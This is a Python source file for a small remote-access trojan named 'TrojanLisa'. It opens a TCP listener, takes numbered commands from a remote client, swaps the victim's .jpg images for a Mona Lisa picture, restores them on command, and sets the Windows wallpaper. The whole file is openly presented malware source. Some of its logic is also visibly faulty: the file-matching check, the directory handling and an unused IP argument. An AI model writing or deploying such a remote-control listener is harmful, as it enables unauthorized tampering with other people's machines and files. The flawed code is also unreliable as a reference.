import os
import shutil
import socket
import ctypes
import sys

class TrojanLisa:
    def __init__(self):
        self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.active = False
        self.filetype = ".jpg"
        self.wallpaper = ".." + os.sep + "img" + os.sep + "mona_lisa.jpg"
        self.extension = "tl_"

    """ Server that opens a TCP socket. """
    def host(self, ip_addr, port):
        self.active = True
        self.serv.bind((ip_addr, port))
        self.serv.listen()
        while self.active:
            conn, addr = self.serv.accept()
            while self.active:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    resp = data.decode()
                    print(resp)
                    execution_status = self.execute(resp)
                    if execution_status == True:
                        message = "Response: Success"
                    else:
                        message = "Response: Failure"
                    conn.send(message.encode())
                except:
                    break
            conn.close()
            print("Client disconnected")

    """ Execute command passed from RAT interface. """
    def execute(self, command):
        if command == "1":
            print("Replacing images with Mona Lisa...")
            self.propagate(restore=False)
        elif command == "2":
            print("Restoring original images...")
            self.propagate(restore=True)
        elif command == "3":
            if sys.platform != "win32":
                return False
            print("Changing background...")
            self.change_wallpaper()
        elif command == "4":
            print("Killing the RAT...")
            self.active = False
        else:
            print("Invalid command.")
            return False
        return True

    """ Replace an image with a copy of Mona Lisa """
    def replace_image(self, file):
        src = os.path.join(os.curdir, file)
        tmp_file = os.path.join(os.curdir, self.extension + file)
        if not os.path.isfile(tmp_file):
            print("Overwriting", file)
            hidden_file = self.extension + file
            dst = os.path.join(os.curdir, hidden_file)
            os.rename(src, dst)
            shutil.copyfile(self.wallpaper, src)
        else:
            print("Already overwrote", file)
    
    """ Restore an image to its original state """
    def restore_image(self, file):
        original_name = file[3:]
        src = os.path.join(os.curdir, file)
        dst = os.path.join(os.curdir, original_name)
        os.replace(src, dst)

    """ Traverse and propagate through the file system """
    def propagate(self, restore=False):
        for subdir, dirs, files in os.walk(os.curdir):
            for file in files:
                if file.endswith(self.filetype) and file.startswith(self.extension):
                    if restore:
                        self.restore_image(file)
                    else:
                        self.replace_image(file)

    """ Changes target's wallpaper to Mona Lisa """
    def change_wallpaper(self):
        SPI_SETDESKWALLPAPER = 20
        WALLPAPER_PATH = os.path.abspath(self.wallpaper)
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH , 0)
            
if __name__=="__main__":
    trojan_lisa = TrojanLisa()
    try:
        arg1 = sys.argv[1]
    except IndexError:
        raise SystemExit(f"Usage: {sys.argv[0]} <ip_address>")
        
    if sys.platform == "win32":
        #trojan_lisa.host('127.0.0.1', 8080)
        pass
    else:
        print("Trojan Lisa can only be run on Windows.")
